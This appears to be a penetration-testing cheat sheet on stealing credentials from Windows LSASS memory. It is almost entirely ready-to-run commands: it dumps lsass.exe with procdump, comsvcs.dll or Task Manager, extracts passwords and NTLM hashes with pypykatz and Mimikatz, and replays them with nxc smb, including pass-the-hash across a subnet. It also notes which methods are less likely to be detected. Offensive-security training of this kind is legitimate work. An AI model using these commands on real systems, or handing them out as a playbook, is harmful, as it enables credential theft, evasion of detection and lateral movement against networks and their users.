---
tags:
  - Credential_Access
  - Foundational
  - Mimikatz
  - Windows
---

## Credential Dumping - LSASS
resources: [HackTricks LSASS Dumping](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#lsass)

> [!important] Extract credentials from LSASS memory. Requires **SeDebugPrivilege** (admin/SYSTEM).

### Procdump - Sysinternals [Remote]
> [!tip] Less detected than **Mimikatz**. Transfer dump to Kali for parsing.

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Parse LSASS Dump [Local]
```bash
pypykatz lsa minidump lsass.dmp > lsass_creds.txt
```

### Parse with Mimikatz [alternative]
```cmd
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit" > lsass_mimikatz.txt
```

### Task Manager Method - GUI [alternative]
> [!tip] Open Task Manager as Admin → Details tab → find lsass.exe → right-click → Create dump file.

```
Dump saved to: C:\Users\<Username>\AppData\Local\Temp\lsass.DMP
```

### comsvcs.dll - No Upload Required [alternative]
> [!tip] Uses built-in Windows DLL. Find LSASS PID first.

```cmd
tasklist | findstr lsass
```

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LsassPID> C:\temp\lsass.dmp full
```

### Mimikatz Direct [alternative]
> [!warning] Parses LSASS directly without creating dump file. More likely to be detected.

```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > lsass_direct.txt
```

### Validate Extracted Credentials [Local]
```bash
nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain>
```

```bash
nxc smb <TargetIP> -u <Username> -H '<NTLMHash>' -d <Domain>
```

```bash
nxc smb 192.168.1.0/24 -u <Username> -H '<NTLMHash>' -d <Domain>
```
